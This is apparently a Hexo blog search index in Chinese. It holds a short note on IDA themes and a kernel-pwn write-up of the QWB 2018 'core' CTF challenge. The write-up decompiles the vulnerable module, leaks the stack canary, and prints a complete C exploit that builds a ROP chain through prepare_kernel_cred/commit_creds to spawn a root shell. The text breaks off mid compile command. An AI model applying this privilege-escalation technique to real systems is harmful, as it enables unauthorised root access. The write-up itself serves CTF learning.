<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>IDA 换主题</title>
    <link href="/2023/12/20/%E6%9D%82%E9%A1%B9/IDA%20%E6%8D%A2%E4%B8%BB%E9%A2%98/"/>
    <url>/2023/12/20/%E6%9D%82%E9%A1%B9/IDA%20%E6%8D%A2%E4%B8%BB%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>在这里下的主题 <a href="https://github.com/Reverier-Xu/IDA-Skins">https://github.com/Reverier-Xu/IDA-Skins</a></p><p>在options-&gt;color里换</p><p>（￣︶￣）↗　</p><p><img src="/img/basic/10.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Others</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kernel pwn</title>
    <link href="/2023/12/19/ctf-pwn/kernel%20pwn/"/>
    <url>/2023/12/19/ctf-pwn/kernel%20pwn/</url>
    
    <content type="html"><![CDATA[<p>前置知识见<a href="https://isolator-1.github.io/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/">这篇</a>，记录了控制流转移和cred的相关内容</p><h3 id="镜像格式"><a href="#镜像格式" class="headerlink" title="镜像格式"></a>镜像格式</h3><p><code>bzImage</code> ：适用于大于512kB的kernel，开头自带gzip的解压代码</p><p><code>zImage</code> ：小于512kB的kernel</p><p><code>vmlinux</code> ：静态链接的linux kernel可执行文件，压缩之后（添加解压代码）为<code>vmlinuz</code>，即<code>bzImage</code>或<code>zImage</code></p><h3 id="强网杯2018-core"><a href="#强网杯2018-core" class="headerlink" title="强网杯2018 - core"></a>强网杯2018 - core</h3><p>一道最简单的kernel pwn，是个rop题</p><p>从别人的博客下的文件：<a href="https://arttnba3.cn/download/qwb2018/pwn/core.7z">https://arttnba3.cn/download/qwb2018/pwn/core.7z</a></p><p>解压之后有<code>bzImage</code> <code>start.sh</code> <code>vmlinux</code> <code>core.cpio</code> 四个文件</p><p>先看<code>start.sh</code> 第一个参数<code>-m</code>指定虚拟机内存大小，一开始给的是64M，但是开不开机，所以要改大一点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-x86_64 \<br>-m 128M \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \<br>-s  \<br>-netdev user,<span class="hljs-built_in">id</span>=t0, -device e1000,netdev=t0,<span class="hljs-built_in">id</span>=nic0 \<br>-nographic  \<br></code></pre></td></tr></table></figure><p><code>-initrd</code>参数用于指定一个包含初始化 RAM disk（initramfs）的文件，这个文件将会在虚拟机启动时加载到内存中。在启动Linux内核时，initramfs通常包含用于引导、初始化和挂载根文件系统所需的文件和脚本。其他的参数就先不管了</p><p><code>-nographic</code>删掉之后会卡在booting the kernel，不知道为啥</p><p><code>-kernel</code> 指定内核镜像 </p><blockquote><p>如果没给vmlinux，是可以从bzImage提取出来的，用torvalds linus写的shell scripts😮<br><a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux</a></p></blockquote><p>首先解压文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> core.cpio core.cpio.gz<br>gunzip ./core.cpio.gz <br>cpio -idm &lt; ./core.cpio<br></code></pre></td></tr></table></figure><p>这样就把文件系统提取出来了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ubuntu@ubuntu:~/Desktop/give_to_player$ <span class="hljs-built_in">cd</span> core<br>ubuntu@ubuntu:~/Desktop/give_to_player/core$ <span class="hljs-built_in">ls</span><br>bin      etc          init  lib64    proc  sbin  tmp  vmlinux<br>core.ko  gen_cpio.sh  lib   linuxrc  root  sys   usr<br></code></pre></td></tr></table></figure><p>查看<code>init</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br>mkdir -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br>chmod 666 /dev/ptmx<br>cat /proc/kallsyms &gt; /tmp/kallsyms<br>echo 1 &gt; /proc/sys/kernel/kptr_restrict<br>echo 1 &gt; /proc/sys/kernel/dmesg_restrict<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2<br>insmod /core.ko<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">poweroff -d 120 -f &amp;    120秒之后自动关机，注释掉</span><br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br>echo &#x27;sh end!\n&#x27;<br>umount /proc<br>umount /sys<br><br>poweroff -d 0  -f           <br></code></pre></td></tr></table></figure><p>其中<code>cat /proc/kallsyms &gt; /tmp/kallsyms</code>把符号表复制了一份出来，这个<code>kallsyms</code>提供了kernel的符号表信息，把符号表复制到了tmp里，因此可以通过它来泄露<code>commit_creds</code>和<code>prepare_kernel_cred</code>（但因为开了kaslr，还要算偏移量）</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dns">/ $ cat /tmp/kallsyms <br><span class="hljs-number">0000000000000000</span> <span class="hljs-keyword">A</span> irq_stack_union<br><span class="hljs-number">0000000000000000</span> <span class="hljs-keyword">A</span> __per_cpu_start<br>ffffffff<span class="hljs-number">91200000</span> T startup_64<br>ffffffff<span class="hljs-number">91200000</span> T _stext<br>ffffffff<span class="hljs-number">91200000</span> T _text<br>ffffffff<span class="hljs-number">91200030</span> T secondary_startup_64<br>ffffffff<span class="hljs-number">912000e0</span> T verify_cpu<br>ffffffff<span class="hljs-number">912001e0</span> T start_cpu0<br>ffffffff<span class="hljs-number">912001f0</span> T __startup_64<br>ffffffff<span class="hljs-number">91200370</span> T __startup_secondary_64<br>ffffffff<span class="hljs-number">91200380</span> t run_init_process<br>ffffffff<span class="hljs-number">912003b0</span> t try_to_run_init_process<br>ffffffff<span class="hljs-number">912003e0</span> t initcall_blacklisted<br>ffffffff<span class="hljs-number">912004a0</span> T do_one_initcall<br>ffffffff<span class="hljs-number">91200600</span> t match_dev_by_uuid<br>ffffffff<span class="hljs-number">91200630</span> T name_to_dev_t<br></code></pre></td></tr></table></figure><blockquote><p>init 中，kptr_restrict = 1，不能直接读/proc/kallsyms</p><p>但是试了一下，发现还是可以通过cat读取符号表（没有root，uid还是1000）但是exp里改成proc之后kernel会崩溃</p></blockquote><p>获取这两个函数地址的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs C">ksyms_file = fopen(<span class="hljs-string">&quot;/proc/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br><span class="hljs-keyword">if</span>(ksyms_file == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(ksyms_file, <span class="hljs-string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf)) &#123;<br>    <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds) &#123;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>)) &#123;<br>        commit_creds = addr;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>               <span class="hljs-string">&quot;[+] Successful to get the addr of commit_cread:&quot;</span><br>               <span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, commit_creds);<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>)) &#123;<br>        prepare_kernel_cred = addr;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>               <span class="hljs-string">&quot;[+] Successful to get the addr of prepare_kernel_cred:&quot;</span><br>               <span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, prepare_kernel_cred);<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在init中，ismod加载了一个自定义的模块</p><blockquote><p><code>insmod</code> 是 Linux 系统上用于加载内核模块的命令。<code>insmod</code> 命令允许你将一个预编译的内核模块插入（即加载）到运行的内核中。</p></blockquote><p>用ida打开提取出来的core.ko</p><p>首先，这个程序在init module里创建了一个叫core的进程</p><p>找到core_ioctl，这个就是调用函数ioctl执行的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">core_ioctl</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span><br>&#123;<br>  <span class="hljs-keyword">switch</span> ( (_DWORD)a2 )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x6677889B</span>:<br>      core_read(a3);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x6677889C</span>:<br>      printk(&amp;unk_2CD, a3);<br>      off = a3;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x6677889A</span>:<br>      printk(&amp;unk_2B3, a2);<br>      core_copy_func(a3);<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>实际的漏洞点在core_read里，它的参数，也就是ioctl的第三个参数，是用户态栈上的参数，向这个地址写入64个字节，可以用来泄露canary</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">core_read</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// rdi</span><br>  __int64 i; <span class="hljs-comment">// rcx</span><br>  <span class="hljs-type">unsigned</span> __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br><br>  v7 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  printk(&amp;unk_25B, a2);<br>  printk(&amp;unk_275, off);<br>  v3 = v6;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">16LL</span>; i; --i )<br>  &#123;<br>    *(_DWORD *)v3 = <span class="hljs-number">0</span>;<br>    v3 += <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-built_in">strcpy</span>(v6, <span class="hljs-string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);<br>  result = copy_to_user(a1, &amp;v6[off], <span class="hljs-number">64LL</span>);<br>  <span class="hljs-keyword">if</span> ( !result )<br>    <span class="hljs-keyword">return</span> __readgsqword(<span class="hljs-number">0x28</span>u) ^ v7;<br>  __asm &#123; swapgs &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>结合前面的ioctl，可以得到如下exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">set_off_val(fd, <span class="hljs-number">64</span>);<br>core_read(fd, buf);<br>canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>在core write函数里，用户可以对着kernel stack进行写入（至多0x800字节），这里可以构造rop溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;   <br><span class="hljs-comment">// 关于这个偏移量怎么算的，关掉kaslr，然后打开kallsyms，查看这个函数的地址</span><br><span class="hljs-comment">// 但是ctf-wiki那个我没看懂，hex(vmlinux.sym[&#x27;commit_creds&#x27;] - 0xffffffff81000000)我和它不一样，不知道它用的是哪个vmlinux，我用根目录下的那个是不对的</span><br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>;i++) &#123;<br>    rop_chain[i] = canary;<br>&#125;<br>rop_chain[i++] = POP_RDI_RET + offset;<br>rop_chain[i++] = <span class="hljs-number">0</span>;<br>rop_chain[i++] = prepare_kernel_cred;<br>rop_chain[i++] = POP_RDX_RET + offset;<br>rop_chain[i++] = POP_RCX_RET + offset; <span class="hljs-comment">// clear useless stack data</span><br>rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + offset;<br>rop_chain[i++] = commit_creds;<br>rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>rop_chain[i++] = <span class="hljs-number">0</span>;<br>rop_chain[i++] = IRETQ + offset;<br>rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>rop_chain[i++] = user_cs;<br>rop_chain[i++] = user_rflags;<br>rop_chain[i++] = user_sp;<br>rop_chain[i++] = user_ss;<br></code></pre></td></tr></table></figure><p>这里要用到的rop是用ropper(pip3 install)算的，但是这个好像对性能要求很高（</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">time ~<span class="hljs-regexp">/.local/</span>bin<span class="hljs-regexp">/ropper --file ./</span>vmlinux --nocolor &gt; g1<br></code></pre></td></tr></table></figure><p>这个输出有24M😵‍💫</p><p>完整exp（还是抄的arttnba3大佬的）🐄🐄🐄🐄</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>  IRETQ 0xffffffff81050ac2</span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0</span>, prepare_kernel_cred = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;[+] Successful to get the root. Execve root shell now...&quot;</span><br>         <span class="hljs-string">&quot;\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off_val</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, nbytes);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    FILE *ksyms_file;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-type">size_t</span> offset, canary;<br>    <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m&quot;</span>);<br>    save_status();<br><br>    fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the /proc/core !\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//get the addr</span><br>    ksyms_file = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(ksyms_file == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(ksyms_file, <span class="hljs-string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf)) &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>)) &#123;<br>            commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>                   <span class="hljs-string">&quot;[+] Successful to get the addr of commit_cread:&quot;</span><br>           <span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>)) &#123;<br>            prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>                   <span class="hljs-string">&quot;[+] Successful to get the addr of prepare_kernel_cred:&quot;</span><br>           <span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-comment">// get the canary</span><br>    set_off_val(fd, <span class="hljs-number">64</span>);<br>    core_read(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">//construct the ropchain</span><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>;i++) &#123;<br>        rop_chain[i] = canary;<br>    &#125;<br>    rop_chain[i++] = POP_RDI_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = prepare_kernel_cred;<br>    rop_chain[i++] = POP_RDX_RET + offset;<br>    rop_chain[i++] = POP_RCX_RET + offset; <span class="hljs-comment">// clear useless stack data</span><br>    rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + offset;<br>    rop_chain[i++] = commit_creds;<br>    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = IRETQ + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x800</span>);<br>    core_copy(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc exploit.c -static -masm=intel -g -o 